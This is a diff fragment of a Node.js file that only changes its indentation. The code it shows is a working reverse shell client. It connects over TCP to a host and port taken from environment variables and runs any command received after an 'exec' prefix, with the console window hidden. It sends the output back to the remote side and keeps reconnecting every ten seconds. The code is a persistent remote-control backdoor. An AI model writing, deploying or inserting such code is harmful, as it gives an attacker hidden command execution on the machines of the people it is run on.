@@ -16,38 +16,37 @@ const HOST = process.env.HOST;
 const client = new net.Socket();
 
 function connect() {
-  client.connect(PORT, HOST);
+	client.connect(PORT, HOST);
 }
 
 client.on("data", (data) => {
-  const dataStr = data.toString().toLowerCase();
-  if (dataStr.startsWith("exec") && dataStr.split(" ")[1] === "cd") {
-    path = shell.changeDir(data, path);
-  }
+	const dataStr = data.toString().toLowerCase();
+	if (dataStr.startsWith("exec") && dataStr.split(" ")[1] === "cd") {
+		path = shell.changeDir(data, path);
+	}
 
-  async function execute(command) {
-    await exec(
-      command,
-      { cwd: path, windowsHide: true },
-      (e, stdout, stderr) => {
-        client.write(`${stdout}\n`);
-      }
-    );
-  }
-  if (dataStr.startsWith("exec"))
-    execute(dataStr.replace("exec", ""));
+	async function execute(command) {
+		await exec(
+			command,
+			{ cwd: path, windowsHide: true },
+			(e, stdout, stderr) => {
+				client.write(`${stdout}\n`);
+			}
+		);
+	}
+	if (dataStr.startsWith("exec")) execute(dataStr.replace("exec", ""));
 });
 
 client.on("close", () => {
-  setTimeout(() => {
-    connect();
-  }, 10000);
+	setTimeout(() => {
+		connect();
+	}, 10000);
 });
 
 client.on("error", () => {
-  setTimeout(() => {
-    connect();
-  }, 10000);
+	setTimeout(() => {
+		connect();
+	}, 10000);
 });
 
 connect();
